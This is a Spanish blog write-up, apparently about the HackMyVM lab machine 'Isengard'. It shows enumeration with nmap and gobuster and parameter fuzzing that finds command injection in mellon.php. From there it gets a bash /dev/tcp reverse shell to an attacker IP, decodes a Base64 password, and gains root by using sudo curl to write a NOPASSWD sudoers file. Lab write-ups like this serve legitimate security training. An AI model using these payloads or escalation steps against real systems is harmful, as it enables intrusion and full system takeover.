---
layout: post
title: Isengard
date: 2022-12-05
categories: ["HMV", "Enumeration", "Base64", "File Edit"]
thumbnail: "assets/images/Isengard.png"
---

# Isengard [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.112 -oG allPorts`
- `nmap -sCV -p80 192.168.1.112 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Si nos vamos a la web veremos un texto, es una referencia al `Señor de los Anillos`. Vemos una imagen con unas letras algo extrañas, si inspeccionamos el código veremos un archivo `CSS`, si lo inspeccionamos veremos una nota al principio la cual nos dice la tipografía que quiere añadir, pero todo esto es una distracción, no nos servirá de nada.

En el mismo archivo `CSS` si bajamos hasta el final veremos otro comentario que nos llama mucho más la atención que el anterior:

> /* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */

Vemos que nos dice que en el archivo `robots.txt` tiene que poner la `URL` `/y0ush4lln0tp4ss`. Bien! Vamos a ver qué contiene dicho directorio.

Cuando entramos vemos una imagen sin relevancia alguna, así que vamos a `fuzzear` para descubrir directorios y archivos. Para ello utilizaré `GoBuster`, es más rápido que `WFuzz`:

```
gobuster dir -u "http://192.168.1.112/y0ush4lln0tp4ss/" -w directory-list-2.3-medium.txt -x php,txt,html
```

```
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 250]
/.php                 (Status: 403) [Size: 278]
/east                 (Status: 301) [Size: 329] [--> http://192.168.1.112/y0ush4lln0tp4ss/east/]
```

Bien! Vemos otro directorio con el nombre `east`! Cuando entramos sólo vemos una imagen, de nuevo es irrelevante, por lo que de nuevo usaremos `GoBuster`:

```
gobuster dir -u "http://192.168.1.112/y0ush4lln0tp4ss/east/" -w directory-list-2.3-medium.txt -x php,txt,html
```

```
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 285]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/mellon.php           (Status: 200) [Size: 0]
```

Vemos un archivo `PHP` con el nombre de `mellon.php`. Como vemos tiene un tamaño de cero caracteres, seguramente sea porque necesita algún parámetro para que funcione. Para descubir dicho parámetro utilizaré `WFuzz`:

```
wfuzz -u "http://192.168.1.112/y0ush4lln0tp4ss/east/mellon.php?FUZZ=pwd" -w rockyou.txt --hc 404 --hh 0 -t 300
```

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
000014579:   200        1 L      1 W        35 Ch       "frodo"
```

Como vemos con el parámetro `frodo` recibimos una respuesta, si lo vemos en el navegador veremos la ruta en la que se encuentra, por lo que hemos encontrado un `RCE`. Para obtener una Reverse Shell me puse en escucha con `NC` por el puerto (en mi caso) `4444`:

- `nc -nlvp 4444`

Una vez hecho lo anterior me fui a [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) y me copié la Reverse Shell en `Bash`. Con esto hecho cambié los `&` por su versión `URLencoded` (`%26`).

```
http://192.168.1.112/y0ush4lln0tp4ss/east/mellon.php?frodo=bash -c 'bash -i >%26 /dev/tcp/192.168.1.103/4444 0>%261'
```

Bien! Estamos en la máquina como `www-data`!

### Subida de privilegios #1
Una vez en la máquina como `www-data` tenemos que convertirnos en `Sauron`. Dentro del directorio en el que nos encontramos vemos un archivo con el nombre ded `oooREADMEooo`. Vamos a leerlo:

> it is not easy to find the unique ring
>
> keep searching

Nos dice que no es fácil encontrar el único anillo, que sigamos buscando. También vemos un fichero `ZIP` con el nombre de `ring.zip`, por lo que suponía que todos los anillos que debíamos encontrar tenían el mismo nombre, por lo que con `find` busqué dicho fichero:

- `find / -name "ring*" 2>/dev/null`

Vemos dos resultados: El que está en el directorio en el que nos encontramos y uno más interesante en el directorio `/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/`.

Me pasé el `ZIP` a mi máquina y con `unzip` lo extraje. Vemos un fichero con el nombre `ring.txt`, vamos a ver qué contiene:

```
ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==
```

Es una cadena en `Base64`! Vamos a decodificarla:

- `echo "ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==" | base64 -d`

```
eVhLTXc1d3BTQXJMMkNMWAo=
```

Otra cadena! De nuevo vamos a decodificarla:

- `echo "eVhLTXc1d3BTQXJMMkNMWAo=" | base64 -d`

```
yXKMw5wpSArL2CLX
```

Eso ya no es `Base64`, es la contraseña de `Sauron` (`sauron:yXKMw5wpSArL2CLX`)!

### Subida de privilegios #2
Una vez como `Sauron` podemos ejecutar `sudo -l` para listar todo lo que podemos hacer:

```
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
```

Bien! Podemos ejecutar `CURL` como cualquier usuario, es decir, como `root` sin contraseña. Para poder convertirnos en `root` me creé un fichero con el nombre de `sauron` en mi directorio personal para que con `CURL` llevarlo a `/etc/sudoers.d/` y tener todos los permisos.

Primero vamos a crearnos el fichero para que podamos ejecutar todo sin contraseña y como `root`:

```
sauron ALL=(ALL) NOPASSWD: ALL
```

Una vez hecho esto vamos a la parte de `CURL`:

- `sudo curl file:///home/sauron/sauron /etc/sudoers.d/sauron`

Bien! Una vez hecho esto podemos volver a mirar con `sudo -l` lo que podemos hacer y veremos una línea extra!

```
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
    (ALL) NOPASSWD: ALL
```

Enhorabuena! Estamos como `root` en la máquina víctima! Cuánta enumeración!